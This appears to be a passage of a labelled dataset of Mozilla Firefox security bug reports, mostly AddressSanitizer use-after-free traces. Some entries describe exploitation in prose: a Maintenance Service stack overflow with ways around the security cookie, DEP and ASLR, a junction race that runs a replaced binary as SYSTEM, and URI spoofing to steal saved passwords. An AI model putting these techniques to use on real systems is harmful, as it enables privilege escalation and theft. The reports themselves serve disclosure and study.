src/xpcom/threads/nstimerimpl.cpp:565 39 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 40 in ns_processnextevent_p nsithread bool src/objdir-ff-asan/xpcom/build/nsthreadutils.cpp:238 41 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 42 in runinternal src/ipc/chromium/src/base/message_loop.cc:215 43 in runhandler src/ipc/chromium/src/base/message_loop.cc:208 44 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 45 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 46 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 47 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3826 48 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3893 49 in xre_main src/toolkit/xre/nsapprunner.cpp:4096 50 in do_main src/browser/app/nsbrowserapp.cpp:185 51 in main src/browser/app/nsbrowserapp.cpp:377 52 in 53 in is located 0 bytes to the right of 16384-byte region allocated by thread t0 here 0 in interceptor_calloc 1 in shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 10987 aborting	11
heap-use-after-free in mozilla plugins child geturlnotify 24578 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 8 at thread t0 0 in mozilla plugins child geturlnotify npp char const char const void src dist/include/mozilla/plugins/streamnotifychild.h:32 1 in 2 in 3 in 4 in 5 in 6 in 7 in 8 in 9 in 10 in 11 in 12 in 13 in base messagepumpforui runwithdispatcher base messagepump delegate base messagepumpforui dispatcher src/ipc/chromium/src/base/message_pump_glib.cc:195 14 in messageloop run src/ipc/chromium/src/base/message_loop.cc:216 15 in xre_initchildprocess src/toolkit/xre/nsembedfunctions.cpp:494 16 in main src/ipc/app/mozillaruntimemain.cpp:48 17 in 18 in is located 56 bytes inside of 72-byte region freed by thread t0 here 0 in interceptor_free 1 in mozilla plugins plugininstancechild deallocpstreamnotify mozilla plugins pstreamnotifychild src/dom/plugins/ipc/plugininstancechild.cpp:2406 2 in mozilla plugins pplugininstancechild callpstreamnotifyconstructor mozilla plugins pstreamnotifychild nscstring const nscstring const bool const nscstring const bool const short src/objdir-ff-asan/ipc/ipdl/pplugininstancechild.cpp:821 3 in mozilla plugins child geturlnotify npp char const char const void src/dom/plugins/ipc/pluginmodulechild.cpp:1055 4 in previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 24578 aborting	11
it s possible to set a document s uri to a different document s uri when a replace load happens in a subframe nsdocshell addtosessionhistory reuses an existing shentry without creating a new bfcache entry this can cause nsdocshell internalload to do a short-circuited load between different documents by using this bug it s possible to set a document s uri to a different document s uri an attacker can create a fake login page whose uri is a real login page s uri and if a password for the real login page was already saved in the password manager an attacker can steal the password without user interaction an attacker can inject scripts into a page that uses external scripts with relative urls	9
mozilla maintenance service buffer overflow allowing privilege escalation the mozilla maintenance service is vulnerable to a stack-based buffer overflow allowing an unprivileged user to escalate privileges to nt_authority\system the bug lies in workmonitor.cpp in the processsoftwareupdatecommand function at lines 307-308 where a fixed size array is passed to getinstallationdir wchar installdir max_path l'\0 if getinstallationdir argc argv installdir getinstallationdir in turn performs an unchecked copy of argv 2 into the destination buffer here installdir static bool getinstallationdir int argctmp lpwstr argvtmp wchar aresultdir max_path if argctmp 2 return false wcscpy aresultdir argvtmp 2 maintenanceservice.exe wrongly assumes that its arguments have a valid size however due to the way the maintenance service is configured any unprivileged user can start it with arbitrary arguments this is why firefox can use it to upgrade without triggering an uac prompt in the processsoftwareupdatecommand stack layout the installdir buffer is located 588 bytes before the security cookie used to protect against stack based buffer overflows therefore an argv 2 greater than 588 bytes will trigger a process termination due to this protection and an event will be added to the windows event log the attached poc triggers the bug with a 592 bytes long argv 2 the event can later be viewed with windows event viewer under the windows logs application category problem signature p1 maintenanceservice.exe exe filename p2 19.0.0.4794 exe version p3 511eba22 exe timestamp p7 0000313b faulting offset from imagebase this is the instruction right after security_check_cookie in processsoftwareupdatecommand p8 c0000409 exception type stack buffer overflow although it may look like the bug is not exploitable due to the stack overflow protection it is indeed possible to exploit this bug the service can be launched as many times as needed the attacker gets as many tries as needed the security cookie stack overflow protection is predictable see below aslr and dep are useless see below stack overflow protection the stack overflow protection works by generating a 32 bits integer which is called the security cookie it is supposed to be random however it is not it is obtained by xoring the result of getsystemtimeasfiletime gettickcount queryperformancecounter the process id and the thread id an attacker can call the 3 functions just before launching the service and the results will be nearly identical as they are all time-based even if there is a difference it ll affect only the lowest bits of the security cookie the process id is predictable as is the thread id furthermore they are low values never superior to 1,000,000 and as such will affect only the lowest bits of the security cookie this makes the real entropy of the security cookie 16 bits low enough to make an attack practical aslr and dep dep is defeated with a rop payload aslr is useless because the base addresses of some dlls like ntdll and kernel32 are randomized at boot time and do n't change until next reboot an attacker running can just call getmodulehandle to get their base addresses and adapt the payload this was tested on windows 7 64 bits and it should work on all versions of windows	11
use of preservewrapper in cases when we do n't have a wrapper seems broken consider the following scenario 1 xhr starts 2 its wrapper if any is collected 3 a c readystatechange listener calls getresponse and the response type is json or arraybuffer this causes nsxmlhttprequest rootjsresultobjects to be called which calls preservewrapper 4 js touches the xhr object causing it to be wrapped which calls nswrappercache setwrapper in a debug build this will assert fatally in an opt build this will clear the preserved-wrapper flag on the wrapper cache which seems bad should we just preserve that flag on setwrapper and remove the assert in that method perhaps alternately we should stop using preservewrapper to mean hold js objects in xhr note that the above scenario is pretty simple to produce with a worker xhr if extension js can ever touch the main-thread nsxmlhttprequest of it as far as i can tell	9
use-after-free caused by us replacing the nshtmleditor s edit rules object while running scripts from the flush happening in nseditor ispreformatted triggered by execcommand from web content placeholder for pwn2own bug found in firefox by vupen at cansecwest 2013	11
arbitrary code execution by maintenance service with junctions i was having a bit of a poke around the mozilla maintenance service and believe i ve come across a vulnerability that lets unprivileged users execute arbitrary code as the system user the crux of the problem is that updatehelper.cpp islocalfile does n't take into account the existence of junctions which standard users can create we can fool the maintenance service into thinking the updater.exe is on a local drive by creating a junction eg c thumbdrive to a removable drive d pathstriptorootw returns c so the process continues this leads to a race condition since we can dismount the drive after the updater.exe has been validated workmonitor.cpp:403 this kills the write-lock the maintenance service has on the updater.exe between the validation and when the process is run workmonitor.cpp:182 we can replace the lockless file with our malicious payload which the maintenance service then happily executes as the system user i ve attached a proof-of-concept to this bug it executes reliably for me on windows 7 x64 ff 19.0.2 i believe vista and xp would be vulnerable as well but have n't confirmed to run the proof-of-concept you will need to have the binaries run_exploit.exe and payload.exe in c exploit firefox installed to c program files x86 mozilla firefox and a removable drive mounted run_exploit.exe takes one mandatory parameter the drive letter of your removable drive eg c exploit\run_exploit.exe d it will create updater.exe and updater.ini on the removable drive and a c thumbdrive junction payload.exe can be replaced with your payload of choice this one just executes system whoami foo.txt to verify the process has system credentials it will create foo.txt in the root drive source code for both are contained in the attached zip file if you need any more info please let me know seb	2
heap-use-after-free in nsframelist firstchild 16813 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsframelist firstchild const src dist/include/nsframelist.h:229 1 in nsoverflowcontinuationtracker finish nsiframe src/layout/generic/nscontainerframe.cpp:1745 2 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:304 3 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3090 4 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2501 5 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2023 6 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1067 7 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 8 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 9 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1045 10 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 11 in nscontainerframe reflowoverflowcontainerchildren nsprescontext nshtmlreflowstate const nsoverflowareas unsigned int unsigned int src/layout/generic/nscontainerframe.cpp:1148 12 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1042 13 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 14 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 15 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:941 16 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 17 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:487 18 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 19 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:430 20 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:530 21 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:771 22 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 23 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 24 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7801 25 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7942 26 in presshell flushpendingnotifications mozilla changestoflush src/layout/base/nspresshell.cpp:3932 27 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3778 28 in nsdocumentviewer loadcomplete tag_nsresult src/layout/base/nsdocumentviewer.cpp:987 29 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult src/docshell/base/nsdocshell.cpp:6710 30 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6538 31 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6545 32 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult src/uriloader/base/nsdocloader.cpp:1290 33 in nsdocloader dostopdocumentload nsirequest tag_nsresult src/uriloader/base/nsdocloader.cpp:870 34 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:760 35 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:644 36 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:648 37 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult src/netwerk/base/src/nsloadgroup.cpp:676 38 in nsdocument dounblockonload src/content/base/src/nsdocument.cpp:7881 39 in nsdocument unblockonload bool src/content/base/src/nsdocument.cpp:7809 40 in nsdocument dispatchcontentloadedevents src/content/base/src/nsdocument.cpp:4443 41 in nsrunnablemethodimpl void nsdocument true run src dist/include/nsthreadutils.h:367 42 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 43 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 44 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 45 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:216 46 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:209 47 in messageloop run src/ipc/chromium/src/base/message_loop.cc:183 48 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 49 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 50 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3880 51 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3947 52 in xre_main src/toolkit/xre/nsapprunner.cpp:4150 53 in do_main int char nsifile src/browser/app/nsbrowserapp.cpp:228 54 in main src/browser/app/nsbrowserapp.cpp:529 55 in 56 in is located 0 bytes inside of 16-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free src/memory/mozalloc/mozalloc.cpp:48 2 in tryremoveframe nsiframe mozilla framepropertytable mozilla framepropertydescriptor const nsiframe bool nsframelist nsiframe src dist/include/mozilla/mozalloc.h:225 3 in nscontainerframe stealframe nsprescontext nsiframe bool src/layout/generic/nscontainerframe.cpp:1259 4 in nsblockframe stealframe nsprescontext nsiframe bool src/layout/generic/nsblockframe.cpp:5616 5 in nscontainerframe deletenextinflowchild nsprescontext nsiframe bool src/layout/generic/nscontainerframe.cpp:1408 6 in nsblockframe deletenextinflowchild nsprescontext nsiframe bool src/layout/generic/nsblockframe.cpp:5701 7 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:305 8 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3090 9 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2501 10 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2023 11 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1067 12 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 13 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 14 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1045 15 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 16 in nscontainerframe reflowoverflowcontainerchildren nsprescontext nshtmlreflowstate const nsoverflowareas unsigned int unsigned int src/layout/generic/nscontainerframe.cpp:1148 17 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1042 18 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 19 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 20 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:941 21 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 22 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:487 23 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 24 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:430 25 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:530 26 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:771 27 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 28 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 29 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7801 previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in nsoverflowcontinuationtracker insert nsiframe unsigned int src dist/include/mozilla/mozalloc.h:201 3 in nscontainerframe reflowoverflowcontainerchildren nsprescontext nshtmlreflowstate const nsoverflowareas unsigned int unsigned int src/layout/generic/nscontainerframe.cpp:1185 4 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1042 5 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 6 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 7 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:941 8 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 9 in nscontainerframe reflowoverflowcontainerchildren nsprescontext nshtmlreflowstate const nsoverflowareas unsigned int unsigned int src/layout/generic/nscontainerframe.cpp:1148 10 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1042 11 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 12 in nscolumnsetframe reflowchildren nshtmlreflowmetrics nshtmlreflowstate const unsigned int nscolumnsetframe reflowconfig const bool nscollapsingmargin nscolumnsetframe columnbalancedata src/layout/generic/nscolumnsetframe.cpp:671 13 in nscolumnsetframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscolumnsetframe.cpp:1045 14 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 15 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:487 16 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 17 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:430 18 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:530 19 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:771 20 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:968 21 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 22 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7801 23 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7942 24 in presshell flushpendingnotifications mozilla changestoflush src/layout/base/nspresshell.cpp:3932 25 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3778 26 in nsdocument flushpendingnotifications mozflushtype src/content/base/src/nsdocument.cpp:6986 27 in mozilla dom element getprimaryframe mozflushtype src/content/base/src/element.cpp:1626 28 in mozilla dom element getstyledframe src/content/base/src/element.cpp:486 29 in nsgenerichtmlelement getoffsetrect nsrect src/content/html/content/src/nsgenerichtmlelement.cpp:397 shadow bytes around the buggy address fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 16813 aborting	11
compartment mismatch in nsxblbinding doinitjsclass user agent mozilla/5.0 x11 ubuntu linux x86_64 rv:14.0 gecko/20100101 firefox/14.0.1 build id 20120713224749 steps to reproduce please see the attachments	11
heap-use-after-free in nscontentutils removescriptblocker 18530 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nstarray_impl nscomptr nsirunnable nstarrayinfallibleallocator removeelementsat unsigned int unsigned int dist/include/nscomptr.h:409 1 in nsdocument endupdate unsigned int content/base/src/nsdocument.cpp:4211 2 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2535 3 in nscontentutils setnodetextcontent nsicontent nsastring_internal const bool content/base/src/mozautodocupdate.h:38 4 in mozilla dom fragmentorelement settextcontentinternal nsastring_internal const mozilla errorresult content/base/src/fragmentorelement.cpp:938 5 in mozilla dom nodebinding set_textcontent jscontext js handle jsobject nsinode js value dist/include/nsinode.h:1088 6 in mozilla dom nodebinding genericsetter jscontext unsigned int js value objdir-ff-asan/dom/bindings/nodebinding.cpp:1501 7 in js invokekernel jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:327 8 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.h:135 9 in js invokegetterorsetter jscontext jsobject js value const unsigned int js value js value js/src/jsinterp.cpp:503 10 in js shape set jscontext js handle jsobject js handle jsobject bool js mutablehandle js value js/src/vm/shape-inl.h:309 11 in js baseops setpropertyhelper jscontext js handle jsobject js handle jsobject js handle long unsigned int js mutablehandle js value int js/src/jsobj.cpp:4114 12 in js setpropertyoperation jscontext unsigned char js handle js value js handle js value js/src/jsobjinlines.h:89 13 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2252 14 in js runscript jscontext js stackframe js/src/jsinterp.cpp:340 15 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js abstractframeptr js value js/src/jsinterp.cpp:530 16 in js execute jscontext js handle jsscript jsobject js value js/src/jsinterp.cpp:569 17 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value js/src/jsapi.cpp:5528 18 in nsjscontext evaluatestring nsastring_internal const jsobject js compileoptions bool js value dom/base/nsjsenvironment.cpp:1290 19 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext dom/base/nsglobalwindow.cpp:9957 20 in nsglobalwindow runtimeout nstimeout dom/base/nsglobalwindow.cpp:10209 21 in nsglobalwindow timercallback nsitimer void dom/base/nsglobalwindow.cpp:10478 22 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:496 23 in nstimerevent run xpcom/threads/nstimerimpl.cpp:587 24 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:627 25 in ns_processnextevent_p nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:238 26 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 27 in messageloop run ipc/chromium/src/base/message_loop.cc:216 28 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 29 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:288 30 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3880 31 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3947 32 in xre_main toolkit/xre/nsapprunner.cpp:4150 33 in main browser/app/nsbrowserapp.cpp:228 34 in 35 in is located 16 bytes inside of 32-byte region freed by thread t0 here 0 in interceptor_realloc 1 in moz_xrealloc memory/mozalloc/mozalloc.cpp:86 previously allocated by thread t0 here 0 in interceptor_realloc 1 in moz_xrealloc memory/mozalloc/mozalloc.cpp:86 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 04 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 18530 aborting	11
